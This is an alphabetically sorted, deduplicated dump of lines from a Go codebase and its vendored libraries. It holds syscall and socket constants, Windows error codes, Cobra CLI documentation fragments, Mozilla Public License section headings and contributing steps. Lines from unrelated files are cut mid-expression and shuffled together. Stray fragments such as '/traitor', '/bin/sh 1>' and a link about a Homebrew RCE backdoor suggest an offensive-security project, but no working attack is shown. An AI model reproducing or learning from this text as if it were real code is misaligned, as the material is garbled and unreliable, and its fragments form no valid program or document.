//sys   Times(tms 
//sys   W_Getmntent(buff 
//sys   W_Getmntent_A(buff 
//sys   deleteProcThreadAttributeList(attrlist 
//sys   initializeProcThreadAttributeList(attrlist 
//sys   updateProcThreadAttribute(attrlist 
//sys WTSFreeMemory(ptr uintptr) = wtsapi32.WTSFreeMemory
//sys WTSGetActiveConsoleSessionId() (sessionID uint32)
//sys cm_Get_DevNode_Status(status 
//sys cm_Get_Device_Interface_List(interfaceClass 
//sys cm_Get_Device_Interface_List_Size(len 
//sysnb
//sysnb Uname(buf 
//sysnb pipe(p 
/Include/
/bin/sh 1>
/shared/ntstatus.h 
/shared/winerror.h 
/src/sys/kern/syscalls.master
/traitor
/um/KnownFolders.h 
0 2>
0(FP)
0(FP)     // Return SVC return code
0111 != 0 {
021'
023'
0x01000000 != 0 }
0x1d
0x3fff) 
0x40 != 0 }
0x40 == 0 
0x80 == 0x80 }
0x80206939
0xFF != 0 }
0xFF == 0 }
0xFF == stopped }
0xc020693a
0xf)<<4)
0xf8
0xff == 0 {
0xff==0] = CreateHardLinkW
0xff==0] = CreateSymbolicLinkW
0xff==0] = secur32.GetUserNameExW
0xff==0] = secur32.TranslateNameW
0xfff) << 48
1 : j]
1 == 0 {
1 by InitializeProcThreadAttributeList.
1 is released.
1' since '
1)) ]}
1)/'
1.  What version of Go are you using (
1. Add them to staging (
1. Commit your changes (
1. Construct the set of common code that is idential in all architecture-specific files.
1. Create new pull request
1. Create your feature branch (
1. Definitions
1. Download your fork to your PC (
1. Fork the project.
1. If you'd like to see a feature or an enhancement please open an issue with
1. Make changes and run tests (
1. Push to the branch (
1.1. 
1.10. 
1.11. 
1.12. 
1.13. 
1.14. 
1.2. 
1.3. 
1.4. 
1.5. 
1.6. 
1.7. 
1.8. 
1.9. 
10. Versions of the License
10.1. New Versions
10.2. Effect of New Versions
10.3. Modified Versions
10.4. Distributing Source Code Form that is Incompatible With Secondary Licenses
1000
120](https://blog.intigriti.com/2021/04/28/bug-bytes-120-macos-pwned-homebrew-rce-the-worlds-shortest-backdoor/) - Recommended tools
16(FP)
16)])
1:])
1:]))
1:]...)
1J3lk/Btk7iH1mYJVJoSg0rWojL3nGGDMrqb
1e6 
1e9 
2 1>
2 but use only CTL_MAXNAME
2 for its own implementation of this function.
2) in the length of the directory. Oh well.
2.  What operating system and processor architecture are you using
2. License Grants and Conditions
2. Write this common code to the merged file.
2.0.1  2.0.2  2.0.3
2.1. Grants
2.2. Effective Date
2.3. Limitations on Grant Scope
2.4. Subsequent Licenses
2.5. Representation
2.6. Fair Use
2.7. Conditions
20(FP)
24)(R4)
257460
2Qi/yBIJoUM=
2uQjWwWBic0kuQ3h5pzcJAZvjUSN6
3.  What did you do
3. Remove the common code from all architecture-specific files.
3. Responsibilities
3.1. Distribution of Source Form
3.2. Distribution of Executable Form
3.3. Distribution of a Larger Work
3.4. Notices
3.5. Application of Additional Terms
31368.
32(FP)
32)(R4)
32498.
4.  What did you expect to see
4. Inability to Comply Due to Statute or Regulation
40(FP)
40)(R4)
4096 {
45](https://github.com/hashicorp/go-version/pull/45))
48(FP)
48)(R4)
4ORM
4] = tx[i]
5.  What did you see instead
5. Termination
5.1. The rights granted under this License will terminate automatically if You
5.2. If You initiate litigation against any entity by asserting a patent
53](https://github.com/hashicorp/go-version/pull/53))
56(FP)
56)(R4)
6. Disclaimer of Warranty
64(FP)
64)(R4)
7. Limitation of Liability
72(FP)
73](https://github.com/hashicorp/go-version/pull/73))
8(FP)   // Return 0 on failure
8(FP)   // Return entry point returned by SVC
8. Litigation
80(FP)
85](https://github.com/hashicorp/go-version/pull/85))
87](https://github.com/hashicorp/go-version/pull/87))
88(FP)
88](https://github.com/hashicorp/go-version/pull/88))
8] = p[i]
8yFto/drg2CJ5u0yRoB7fZw3DKv/JXA=
9. Miscellaneous
96(FP)
9EI=
9cSMgmfuvv2VHJ9ezmFNf9Y/XstYU=
: Cobra's default 
: If the 
: If the user does not set 
: Introduce 
: When using the 
: You want to add the Go flags to the 
: You want to alias two flags. aka --old-flag-name == --new-flag-name
: the variable 
< $1 
<!-- Links -->
<PROGRAM>
<PROGRAM>_ACTIVE_HELP
<bg-black>
<bg-blue>
<bg-cyan>
<bg-darkgrey>
<bg-green>
<bg-lightblue>
<bg-lightcyan>
<bg-lightgreen>
<bg-lightgrey>
<bg-lightmagenta>
<bg-lightred>
<bg-lightyellow>
<bg-magenta>
<bg-red>
<bg-white>
<bg-yellow>
<black>
<blink>
<blue>
<bold>
<cyan>
<darkgrey>
<dim>
<green>
<hidden>
<italic>
<lightblue>
<lightcyan>
<lightgreen>
<lightgrey>
<lightmagenta>
<lightred>
<lightyellow>
<magenta>
<red>
<reverse>
<underline>
<white>
<yellow>
= (1 << (uintptr(fd) % NFDBITS))
= (uint64(major) 
= (uint64(minor) 
= (uint64(minor) << 0) 
= (uint64(minor) << 12) 
= (uint64(minor) << 8) 
= (windows.ENABLE_ECHO_INPUT 
= (windows.ENABLE_PROCESSED_OUTPUT 
= 0x1000 // Version 1
= 0xffff
= 100
= 116444736000000000
= 16
= 1e6
= 1e9
= 2 
= 2 {
= 4 {
= 999 // round up to microsecond
= EscapeArg(args[i])
= FILE_APPEND_DATA
= FILE_ATTRIBUTE_READONLY
= GENERIC_WRITE
= O_NONBLOCK
= SizeofPtr
= ]]
= ]] 
= _Socklen(n) 
= a - A
= bits.OnesCount64(uint64(b))
= c.Name()
= cbn
= cmsgAlignOf(int(h.Len))
= copied
= cpuBitsMask(cpu)
= epEvt
= esc
= int(dstDirent.Reclen)
= int(srcDirent.Reclen)
= int32(n) 
= int64(binary.BigEndian.Uint16(uuid[4:6])) << 32
= int64(binary.BigEndian.Uint16(uuid[6:8])
= ipc_64
= len(data)
= nn
= nwmFilterLclAddrMask
= nwmFilterLclPortMask
= pEvt
= places
= reclen
= right
= s.max
= stmp
= t.countToRightWord()
= t.cursorX / t.termWidth
= time.Millisecond / 4 {
= time.Millisecond {
= time.Since(start)
= uint32((dev 
= unix.CS8
= unix.CSIZE 
= unix.ECHO
= unix.ECHO 
= unix.ICANON 
= unix.ICRNL
= unix.IGNBRK 
= unix.OPOST
= usage
=${comp}
=' ]]
=(%q)
=(:)
>' is not supported in older versions of fish.
@test -z $(shell gofmt -l $(SRC)) 
A Cobra command can define flags that persist through to children commands
A Fast and Flexible Static Site Generator built with
A Go module (and standalone binary) to make the output of coloured/formatted text in the terminal easier and more readable.
A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
A few good real world examples may better illustrate this point.
A file containing Go types for passing into (or returning from) syscalls.
A file containing all the generated syscalls for a specific GOOS and GOARCH.
A flag is a way to modify the behavior of a command. Cobra supports
A list of numeric constants for all the syscall number of the specific GOOS
A new V2 bash completion version is also available.  This version can be used by calling 
A0  uint64
A1  uint64
A2  uint64
A3  uint64
A4  uint64
A5  uint64
A6  uint64
A7  uint64
AAFS_MAGIC                                  = 0x5a3c69f0
AAYijkVK3jR786Am1bhDEh2GHT0tIVE5E=
ABOVE_NORMAL_PRIORITY_CLASS   = 0x00008000
ACCESS_SYSTEM_SECURITY   = 0x01000000
ACE_INHERITED_OBJECT_TYPE_PRESENT = 0x2
ACE_OBJECT_TYPE_PRESENT           = 0x1
ACL) (acl 
ACL) (ntstatus error) = ntdll.RtlDefaultNpAcl
ACL) (ntstatus error) {
ACL) (ret error) = advapi32.SetEntriesInAclW
ACL) (ret error) = advapi32.SetNamedSecurityInfoW
ACL) (ret error) = advapi32.SetSecurityInfo
ACL) (ret error) {
ACL)(unsafe.Pointer(
ADD . .
ADFS_SUPER_MAGIC                            = 0xadf5
AFFS_SUPER_MAGIC                            = 0xadff
AFS_FS_MAGIC                                = 0x6b414653
AFS_SUPER_MAGIC                             = 0x5346414f
AF_802                        = 0x12
AF_ALG                                      = 0x26
AF_APPLETALK                                = 0x5
AF_APPLETALK                            = 0x10
AF_APPLETALK                      = 0x10
AF_APPLETALK                    = 16
AF_APPLETALK                   = 0x10
AF_APPLETALK                  = 0x10
AF_ARP                            = 0x1c
AF_ARP                         = 0x23
AF_ASH                                      = 0x12
AF_ATM                            = 0x1e
AF_ATM                         = 0x1e
AF_ATMPVC                                   = 0x8
AF_ATMSVC                                   = 0x14
AF_AX25                                     = 0x3
AF_BLUETOOTH                                = 0x1f
AF_BLUETOOTH                      = 0x1f
AF_BLUETOOTH                      = 0x20
AF_BLUETOOTH                      = 0x21
AF_BLUETOOTH                   = 0x24
AF_BRIDGE                                   = 0x7
AF_BTH     = 32
AF_BYPASS                     = 0x19
AF_CAIF                                     = 0x25
AF_CAN                                      = 0x1d
AF_CCITT                                = 0xa
AF_CCITT                          = 0xa
AF_CCITT                        = 10
AF_CCITT                       = 0xa
AF_CCITT                      = 0xa
AF_CHAOS                                = 0x5
AF_CHAOS                          = 0x5
AF_CHAOS                        = 5
AF_CHAOS                       = 0x5
AF_CHAOS                      = 0x5
AF_CNT                                  = 0x15
AF_CNT                            = 0x15
AF_CNT                         = 0x15
AF_COIP                                 = 0x14
AF_COIP                           = 0x14
AF_COIP                        = 0x14
AF_DATAKIT                              = 0x9
AF_DATAKIT                        = 0x9
AF_DATAKIT                      = 9
AF_DATAKIT                     = 0x9
AF_DATAKIT                    = 0x9
AF_DECnet                                   = 0xc
AF_DECnet                               = 0xc
AF_DECnet                         = 0xc
AF_DECnet                      = 0xc
AF_DECnet                     = 0xc
AF_DLI                                  = 0xd
AF_DLI                            = 0xd
AF_DLI                          = 13
AF_DLI                         = 0xd
AF_DLI                        = 0xd
AF_E164                                 = 0x1c
AF_E164                           = 0x1a
AF_E164                        = 0x1a
AF_ECMA                                 = 0x8
AF_ECMA                           = 0x8
AF_ECMA                         = 8
AF_ECMA                        = 0x8
AF_ECMA                       = 0x8
AF_ECONET                                   = 0x13
AF_ENCAP                          = 0x1c
AF_FILE                                     = 0x1
AF_FILE                       = 0x1
AF_GOSIP                      = 0x16
AF_HYLINK                               = 0xf
AF_HYLINK                         = 0xf
AF_HYLINK                       = 15
AF_HYLINK                      = 0xf
AF_HYLINK                     = 0xf
AF_IB                                       = 0x1b
AF_IEEE80211                            = 0x25
AF_IEEE80211                      = 0x20
AF_IEEE80211                      = 0x23
AF_IEEE80211                   = 0x25
AF_IEEE802154                               = 0x24
AF_IMPLINK                              = 0x3
AF_IMPLINK                        = 0x3
AF_IMPLINK                      = 3
AF_IMPLINK                     = 0x3
AF_IMPLINK                    = 0x3
AF_INET                                     = 0x2
AF_INET                                 = 0x2
AF_INET                           = 0x2
AF_INET                         = 2
AF_INET                        = 0x2
AF_INET                       = 0x2
AF_INET    = 2
AF_INET6                                    = 0xa
AF_INET6                                = 0x1e
AF_INET6                          = 0x18
AF_INET6                          = 0x1c
AF_INET6                        = 19
AF_INET6                       = 0x1c
AF_INET6                      = 0x18
AF_INET6                      = 0x1a
AF_INET6   = 23
AF_INET6_SDP                   = 0x2a
AF_INET_OFFLOAD               = 0x1e
AF_INET_SDP                    = 0x28
AF_INTF                         = 20
AF_INTF                       = 0x14
AF_IPX                                      = 0x4
AF_IPX                                  = 0x17
AF_IPX                            = 0x17
AF_IPX                         = 0x17
AF_IPX                        = 0x17
AF_IRDA                                     = 0x17
AF_IRDA    = 26
AF_ISDN                                     = 0x22
AF_ISDN                                 = 0x1c
AF_ISDN                           = 0x1a
AF_ISDN                        = 0x1a
AF_ISO                                  = 0x7
AF_ISO                            = 0x7
AF_ISO                         = 0x7
AF_ISO                        = 0x7
AF_IUCV                                     = 0x20
AF_IUCV                         = 17
AF_KCM                                      = 0x29
AF_KEY                                      = 0xf
AF_KEY                            = 0x1e
AF_KEY                        = 0x1b
AF_LAT                                  = 0xe
AF_LAT                            = 0xe
AF_LAT                          = 14
AF_LAT                         = 0xe
AF_LAT                        = 0xe
AF_LINK                                 = 0x12
AF_LINK                           = 0x12
AF_LINK                         = 18
AF_LINK                        = 0x12
AF_LINK                       = 0x12
AF_LINK                       = 0x19
AF_LLC                                      = 0x1a
AF_LOCAL                                    = 0x1
AF_LOCAL                                = 0x1
AF_LOCAL                          = 0x1
AF_LOCAL                       = 0x1
AF_LOCAL                      = 0x1
AF_LOCAL  = AF_UNIX // AF_LOCAL is an alias for AF_UNIX
AF_MAX                                      = 0x2e
AF_MAX                                  = 0x29
AF_MAX                            = 0x23
AF_MAX                            = 0x24
AF_MAX                          = 30
AF_MAX                         = 0x2a
AF_MAX                        = 0x1e
AF_MAX                        = 0x20
AF_MCTP                                     = 0x2d
AF_MPLS                                     = 0x1c
AF_MPLS                           = 0x21
AF_MPLS                           = 0x22
AF_NATM                                 = 0x1f
AF_NATM                           = 0x1b
AF_NATM                           = 0x1d
AF_NATM                        = 0x1d
AF_NBS                          = 7
AF_NBS                        = 0x7
AF_NCA                        = 0x1c
AF_NDD                          = 23
AF_NDD                        = 0x17
AF_NDRV                                 = 0x1b
AF_NETBEUI                                  = 0xd
AF_NETBIOS                              = 0x21
AF_NETBIOS                        = 0x6
AF_NETBIOS                     = 0x6
AF_NETBIOS = 17
AF_NETGRAPH                       = 0x20
AF_NETGRAPH                    = 0x20
AF_NETLINK                                  = 0x10
AF_NETROM                                   = 0x6
AF_NETWARE                      = 22
AF_NETWARE                    = 0x16
AF_NFC                                      = 0x27
AF_NIT                        = 0x11
AF_NS                                   = 0x6
AF_NS                             = 0x6
AF_NS                           = 6
AF_NS                         = 0x6
AF_OROUTE                         = 0x11
AF_OSI                                  = 0x7
AF_OSI                            = 0x7
AF_OSI                         = 0x7
AF_OSI                        = 0x13
AF_OSI                        = 0x7
AF_OSINET                     = 0x15
AF_PACKET                                   = 0x11
AF_PACKET                     = 0x20
AF_PHONET                                   = 0x23
AF_POLICY                     = 0x1d
AF_PPP                                  = 0x22
AF_PPPOX                                    = 0x18
AF_PUP                                  = 0x4
AF_PUP                            = 0x4
AF_PUP                          = 4
AF_PUP                         = 0x4
AF_PUP                        = 0x4
AF_QIPCRTR                                  = 0x2a
AF_RDS                                      = 0x15
AF_RESERVED_36                          = 0x24
AF_RIF                          = 21
AF_RIF                        = 0x15
AF_ROSE                                     = 0xb
AF_ROUTE                                    = 0x10
AF_ROUTE                                = 0x11
AF_ROUTE                          = 0x11
AF_ROUTE                          = 0x22
AF_ROUTE                        = 20
AF_ROUTE                       = 0x11
AF_ROUTE                      = 0x11
AF_ROUTE                      = 0x18
AF_RXRPC                                    = 0x21
AF_SCLUSTER                    = 0x22
AF_SECURITY                                 = 0xe
AF_SIP                                  = 0x18
AF_SIP                            = 0x18
AF_SIP                            = 0x1d
AF_SIP                         = 0x18
AF_SLOW                        = 0x21
AF_SMC                                      = 0x2b
AF_SNA                                      = 0x16
AF_SNA                                  = 0xb
AF_SNA                            = 0xb
AF_SNA                          = 11
AF_SNA                         = 0xb
AF_SNA                        = 0xb
AF_SYSTEM                               = 0x20
AF_SYS_CONTROL                          = 0x2
AF_TIPC                                     = 0x1e
AF_TRILL                      = 0x1f
AF_UNIX                                     = 0x1
AF_UNIX                                 = 0x1
AF_UNIX                           = 0x1
AF_UNIX                         = 1
AF_UNIX                        = 0x1
AF_UNIX                       = 0x1
AF_UNIX    = 1
AF_UNSPEC                                   = 0x0
AF_UNSPEC                               = 0x0
AF_UNSPEC                         = 0x0
AF_UNSPEC                       = 0
AF_UNSPEC                      = 0x0
AF_UNSPEC                     = 0x0
AF_UNSPEC  = 0
AF_UTUN                                 = 0x26
AF_VENDOR00                    = 0x27
AF_VENDOR01                    = 0x29
AF_VENDOR02                    = 0x2b
AF_VENDOR03                    = 0x2d
AF_VENDOR04                    = 0x2f
AF_VENDOR05                    = 0x31
AF_VENDOR06                    = 0x33
AF_VENDOR07                    = 0x35
AF_VENDOR08                    = 0x37
AF_VENDOR09                    = 0x39
AF_VENDOR10                    = 0x3b
AF_VENDOR11                    = 0x3d
AF_VENDOR12                    = 0x3f
AF_VENDOR13                    = 0x41
AF_VENDOR14                    = 0x43
AF_VENDOR15                    = 0x45
AF_VENDOR16                    = 0x47
AF_VENDOR17                    = 0x49
AF_VENDOR18                    = 0x4b
AF_VENDOR19                    = 0x4d
AF_VENDOR20                    = 0x4f
AF_VENDOR21                    = 0x51
AF_VENDOR22                    = 0x53
AF_VENDOR23                    = 0x55
AF_VENDOR24                    = 0x57
AF_VENDOR25                    = 0x59
AF_VENDOR26                    = 0x5b
AF_VENDOR27                    = 0x5d
AF_VENDOR28                    = 0x5f
AF_VENDOR29                    = 0x61
AF_VENDOR30                    = 0x63
AF_VENDOR31                    = 0x65
AF_VENDOR32                    = 0x67
AF_VENDOR33                    = 0x69
AF_VENDOR34                    = 0x6b
AF_VENDOR35                    = 0x6d
AF_VENDOR36                    = 0x6f
AF_VENDOR37                    = 0x71
AF_VENDOR38                    = 0x73
AF_VENDOR39                    = 0x75
AF_VENDOR40                    = 0x77
AF_VENDOR41                    = 0x79
AF_VENDOR42                    = 0x7b
AF_VENDOR43                    = 0x7d
AF_VENDOR44                    = 0x7f
AF_VENDOR45                    = 0x81
AF_VENDOR46                    = 0x83
AF_VENDOR47                    = 0x85
AF_VSOCK                                    = 0x28
AF_VSOCK                                = 0x28
AF_WANPIPE                                  = 0x19
AF_X25                                      = 0x9
AF_X25                        = 0x14
AF_XDP                                      = 0x2c
AI_CANONNAME   = 2
AI_NUMERICHOST = 4
AI_PASSIVE     = 1
ALG_/ 
ALG_OP_DECRYPT                              = 0x0
ALG_OP_ENCRYPT                              = 0x1
ALG_SET_AEAD_ASSOCLEN                       = 0x4
ALG_SET_AEAD_AUTHSIZE                       = 0x5
ALG_SET_DRBG_ENTROPY                        = 0x6
ALG_SET_IV                                  = 0x2
ALG_SET_KEY                                 = 0x1
ALG_SET_OP                                  = 0x3
ALTWERASE                               = 0x200
ALTWERASE                         = 0x200
ALTWERASE                      = 0x200
ALTWERASE                     = 0x400000
ANON_INODE_FS_MAGIC                         = 0x9041934
APPLICATION_ERROR = 1 << 29
APPMODEL_ERROR_DYNAMIC_PROPERTY_INVALID                                   syscall.Errno = 15705
APPMODEL_ERROR_DYNAMIC_PROPERTY_READ_FAILED                               syscall.Errno = 15704
APPMODEL_ERROR_NO_APPLICATION                                             syscall.Errno = 15703
APPMODEL_ERROR_NO_MUTABLE_DIRECTORY                                       syscall.Errno = 15707
APPMODEL_ERROR_NO_PACKAGE                                                 syscall.Errno = 15700
APPMODEL_ERROR_PACKAGE_IDENTITY_CORRUPT                                   syscall.Errno = 15702
APPMODEL_ERROR_PACKAGE_NOT_AVAILABLE                                      syscall.Errno = 15706
APPMODEL_ERROR_PACKAGE_RUNTIME_CORRUPT                                    syscall.Errno = 15701
APPNAME COMMAND ARG --FLAG
APPNAME VERB NOUN --ADJECTIVE.
APPX_E_BLOCK_HASH_INVALID                                                 Handle        = 0x80080207
APPX_E_CORRUPT_CONTENT                                                    Handle        = 0x80080206
APPX_E_DELTA_APPENDED_PACKAGE_NOT_ALLOWED                                 Handle        = 0x80080210
APPX_E_DELTA_BASELINE_VERSION_MISMATCH                                    Handle        = 0x8008020D
APPX_E_DELTA_PACKAGE_MISSING_FILE                                         Handle        = 0x8008020E
APPX_E_FILE_COMPRESSION_MISMATCH                                          Handle        = 0x80080214
APPX_E_INTERLEAVING_NOT_ALLOWED                                           Handle        = 0x80080201
APPX_E_INVALID_APPINSTALLER                                               Handle        = 0x8008020C
APPX_E_INVALID_BLOCKMAP                                                   Handle        = 0x80080205
APPX_E_INVALID_CONTENTGROUPMAP                                            Handle        = 0x8008020B
APPX_E_INVALID_DELTA_PACKAGE                                              Handle        = 0x8008020F
APPX_E_INVALID_ENCRYPTION_EXCLUSION_FILE_LIST                             Handle        = 0x80080216
APPX_E_INVALID_KEY_INFO                                                   Handle        = 0x8008020A
APPX_E_INVALID_MANIFEST                                                   Handle        = 0x80080204
APPX_E_INVALID_PACKAGESIGNCONFIG                                          Handle        = 0x80080212
APPX_E_INVALID_PACKAGING_LAYOUT                                           Handle        = 0x80080211
APPX_E_INVALID_PAYLOAD_PACKAGE_EXTENSION                                  Handle        = 0x80080215
APPX_E_INVALID_SIP_CLIENT_DATA                                            Handle        = 0x80080209
APPX_E_MISSING_REQUIRED_FILE                                              Handle        = 0x80080203
APPX_E_PACKAGING_INTERNAL                                                 Handle        = 0x80080200
APPX_E_RELATIONSHIPS_NOT_ALLOWED                                          Handle        = 0x80080202
APPX_E_REQUESTED_RANGE_TOO_LARGE                                          Handle        = 0x80080208
APPX_E_RESOURCESPRI_NOT_ALLOWED                                           Handle        = 0x80080213
ARG GOARCH=amd64
ARG GOOS=linux
ARG GOVERSION=1.14
ARPHRD
ARPHRD_6LOWPAN                              = 0x339
ARPHRD_802_3                  = 0x6
ARPHRD_802_5                  = 0x6
ARPHRD_ADAPT                                = 0x108
ARPHRD_APPLETLK                             = 0x8
ARPHRD_ARCNET                               = 0x7
ARPHRD_ARCNET                     = 0x7
ARPHRD_ARCNET                 = 0x7
ARPHRD_ASH                                  = 0x30d
ARPHRD_ATM                                  = 0x13
ARPHRD_ATM                    = 0x10
ARPHRD_AX25                                 = 0x3
ARPHRD_AX25                   = 0x3
ARPHRD_BIF                                  = 0x307
ARPHRD_CAIF                                 = 0x336
ARPHRD_CAN                                  = 0x118
ARPHRD_CHAOS                                = 0x5
ARPHRD_CHAOS                  = 0x5
ARPHRD_CISCO                                = 0x201
ARPHRD_CSLIP                                = 0x101
ARPHRD_CSLIP6                               = 0x103
ARPHRD_DDCMP                                = 0x205
ARPHRD_DLCI                                 = 0xf
ARPHRD_ECONET                               = 0x30e
ARPHRD_EETHER                               = 0x2
ARPHRD_EETHER                 = 0x2
ARPHRD_ETHER                                = 0x1
ARPHRD_ETHER                      = 0x1
ARPHRD_ETHER                  = 0x1
ARPHRD_EUI64                                = 0x1b
ARPHRD_FC                     = 0x12
ARPHRD_FCAL                                 = 0x311
ARPHRD_FCFABRIC                             = 0x313
ARPHRD_FCPL                                 = 0x312
ARPHRD_FCPP                                 = 0x310
ARPHRD_FDDI                                 = 0x306
ARPHRD_FDDI                   = 0x1
ARPHRD_FRAD                                 = 0x302
ARPHRD_FRAME                  = 0xf
ARPHRD_FRELAY                     = 0xf
ARPHRD_HDLC                                 = 0x201
ARPHRD_HDLC                   = 0x11
ARPHRD_HIPPI                                = 0x30c
ARPHRD_HWX25                                = 0x110
ARPHRD_IB                     = 0x20
ARPHRD_IEEE1394                             = 0x18
ARPHRD_IEEE1394                   = 0x18
ARPHRD_IEEE802                              = 0x6
ARPHRD_IEEE802                    = 0x6
ARPHRD_IEEE802                = 0x6
ARPHRD_IEEE80211                            = 0x321
ARPHRD_IEEE80211_PRISM                      = 0x322
ARPHRD_IEEE80211_RADIOTAP                   = 0x323
ARPHRD_IEEE802154                           = 0x324
ARPHRD_IEEE802154_MONITOR                   = 0x325
ARPHRD_IEEE802_TR                           = 0x320
ARPHRD_INFINIBAND                           = 0x20
ARPHRD_IP6GRE                               = 0x337
ARPHRD_IPATM                  = 0x13
ARPHRD_IPDDP                                = 0x309
ARPHRD_IPGRE                                = 0x30a
ARPHRD_IRDA                                 = 0x30f
ARPHRD_LAPB                                 = 0x204
ARPHRD_LOCALTLK                             = 0x305
ARPHRD_LOOPBACK                             = 0x304
ARPHRD_MCTP                                 = 0x122
ARPHRD_METRICOM                             = 0x17
ARPHRD_METRICOM               = 0x17
ARPHRD_NETLINK                              = 0x338
ARPHRD_NETROM                               = 0x0
ARPHRD_NONE                                 = 0xfffe
ARPHRD_PHONET                               = 0x334
ARPHRD_PHONET_PIPE                          = 0x335
ARPHRD_PIMREG                               = 0x30b
ARPHRD_PPP                                  = 0x200
ARPHRD_PRONET                               = 0x4
ARPHRD_RAWHDLC                              = 0x206
ARPHRD_RAWIP                                = 0x207
ARPHRD_ROSE                                 = 0x10e
ARPHRD_RSRVD                                = 0x104
ARPHRD_SIT                                  = 0x308
ARPHRD_SKIP                                 = 0x303
ARPHRD_SLIP                                 = 0x100
ARPHRD_SLIP6                                = 0x102
ARPHRD_STRIP                      = 0x17
ARPHRD_TUNNEL                               = 0x300
ARPHRD_TUNNEL                 = 0x1f
ARPHRD_TUNNEL6                              = 0x301
ARPHRD_VOID                                 = 0xffff
ARPHRD_VSOCKMON                             = 0x33a
ARPHRD_X25                                  = 0x10f
ASI_LEON_DFLUSH                  = 0x11
ASI_LEON_IFLUSH                  = 0x10
ASI_LEON_MMUFLUSH                = 0x18
ATTACH
ATTRIBUTE_SECURITY_INFORMATION        = 0x00000020
ATTR_(BIT_MAP_COUNT
ATTR_BIT_MAP_COUNT                      = 0x5
ATTR_CMN_ACCESSMASK                     = 0x20000
ATTR_CMN_ACCTIME                        = 0x1000
ATTR_CMN_ADDEDTIME                      = 0x10000000
ATTR_CMN_BKUPTIME                       = 0x2000
ATTR_CMN_CHGTIME                        = 0x800
ATTR_CMN_CRTIME                         = 0x200
ATTR_CMN_DATA_PROTECT_FLAGS             = 0x40000000
ATTR_CMN_DEVID                          = 0x2
ATTR_CMN_DOCUMENT_ID                    = 0x100000
ATTR_CMN_ERROR                          = 0x20000000
ATTR_CMN_EXTENDED_SECURITY              = 0x400000
ATTR_CMN_FILEID                         = 0x2000000
ATTR_CMN_FLAGS                          = 0x40000
ATTR_CMN_FNDRINFO                       = 0x4000
ATTR_CMN_FSID                           = 0x4
ATTR_CMN_FULLPATH                       = 0x8000000
ATTR_CMN_GEN_COUNT                      = 0x80000
ATTR_CMN_GRPID                          = 0x10000
ATTR_CMN_GRPUUID                        = 0x1000000
ATTR_CMN_MODTIME                        = 0x400
ATTR_CMN_NAME                           = 0x1
ATTR_CMN_NAMEDATTRCOUNT                 = 0x80000
ATTR_CMN_NAMEDATTRLIST                  = 0x100000
ATTR_CMN_OBJID                          = 0x20
ATTR_CMN_OBJPERMANENTID                 = 0x40
ATTR_CMN_OBJTAG                         = 0x10
ATTR_CMN_OBJTYPE                        = 0x8
ATTR_CMN_OWNERID                        = 0x8000
ATTR_CMN_PARENTID                       = 0x4000000
ATTR_CMN_PAROBJID                       = 0x80
ATTR_CMN_RETURNED_ATTRS                 = 0x80000000
ATTR_CMN_SCRIPT                         = 0x100
ATTR_CMN_SETMASK                        = 0x51c7ff00
ATTR_CMN_USERACCESS                     = 0x200000
ATTR_CMN_UUID                           = 0x800000
ATTR_CMN_VALIDMASK                      = 0xffffffff
ATTR_CMN_VOLSETMASK                     = 0x6700
ATTR_FILE_ALLOCSIZE                     = 0x4
ATTR_FILE_CLUMPSIZE                     = 0x10
ATTR_FILE_DATAALLOCSIZE                 = 0x400
ATTR_FILE_DATAEXTENTS                   = 0x800
ATTR_FILE_DATALENGTH                    = 0x200
ATTR_FILE_DEVTYPE                       = 0x20
ATTR_FILE_FILETYPE                      = 0x40
ATTR_FILE_FORKCOUNT                     = 0x80
ATTR_FILE_FORKLIST                      = 0x100
ATTR_FILE_IOBLOCKSIZE                   = 0x8
ATTR_FILE_LINKCOUNT                     = 0x1
ATTR_FILE_RSRCALLOCSIZE                 = 0x2000
ATTR_FILE_RSRCEXTENTS                   = 0x4000
ATTR_FILE_RSRCLENGTH                    = 0x1000
ATTR_FILE_SETMASK                       = 0x20
ATTR_FILE_TOTALSIZE                     = 0x2
ATTR_FILE_VALIDMASK                     = 0x37ff
ATTR_VOL_ALLOCATIONCLUMP                = 0x40
ATTR_VOL_ATTRIBUTES                     = 0x40000000
ATTR_VOL_CAPABILITIES                   = 0x20000
ATTR_VOL_DIRCOUNT                       = 0x400
ATTR_VOL_ENCODINGSUSED                  = 0x10000
ATTR_VOL_FILECOUNT                      = 0x200
ATTR_VOL_FSTYPE                         = 0x1
ATTR_VOL_INFO                           = 0x80000000
ATTR_VOL_IOBLOCKSIZE                    = 0x80
ATTR_VOL_MAXOBJCOUNT                    = 0x800
ATTR_VOL_MINALLOCATION                  = 0x20
ATTR_VOL_MOUNTEDDEVICE                  = 0x8000
ATTR_VOL_MOUNTFLAGS                     = 0x4000
ATTR_VOL_MOUNTPOINT                     = 0x1000
ATTR_VOL_NAME                           = 0x2000
ATTR_VOL_OBJCOUNT                       = 0x100
ATTR_VOL_QUOTA_SIZE                     = 0x10000000
ATTR_VOL_RESERVED_SIZE                  = 0x20000000
ATTR_VOL_SETMASK                        = 0x80002000
ATTR_VOL_SIGNATURE                      = 0x2
ATTR_VOL_SIZE                           = 0x4
ATTR_VOL_SPACEAVAIL                     = 0x10
ATTR_VOL_SPACEFREE                      = 0x8
ATTR_VOL_SPACEUSED                      = 0x800000
ATTR_VOL_UUID                           = 0x40000
ATTR_VOL_VALIDMASK                      = 0xf087ffff
AT_EACCESS          = 0x1
AT_EACCESS          = 0x100
AT_EACCESS          = 0x4
AT_EACCESS != 0 {
AT_EACCESS = 0x200
AT_EACCESS) != 0 {
AT_EMPTY_PATH   = 0x1000
AT_FDCWD                        = 2  // for Unix  compatibility -- no zos semantics
AT_FDCWD            = -0x2
AT_FDCWD            = -0x64
AT_FDCWD            = 0xffd19553
AT_FDCWD            = 0xfffafdcd
AT_FDCWD        = -0x64
AT_KEYEXCHANGE       = 1
AT_NO_AUTOMOUNT = 0x800
AT_RECURSIVE = 0x8000
AT_REMOVEDIR        = 0x1
AT_REMOVEDIR        = 0x2
AT_REMOVEDIR        = 0x8
AT_REMOVEDIR        = 0x80
AT_REMOVEDIR        = 0x800
AT_REMOVEDIR    = 0x200
AT_SIGNATURE         = 2
AT_STATX_DONT_SYNC    = 0x4000
AT_STATX_FORCE_SYNC   = 0x2000
AT_STATX_SYNC_AS_STAT = 0x0
AT_SYMLINK_FOLLOW   = 0x2000
AT_SYMLINK_FOLLOW   = 0x4
AT_SYMLINK_FOLLOW   = 0x40
AT_SYMLINK_FOLLOW   = 0x400
AT_SYMLINK_FOLLOW   = 0x8
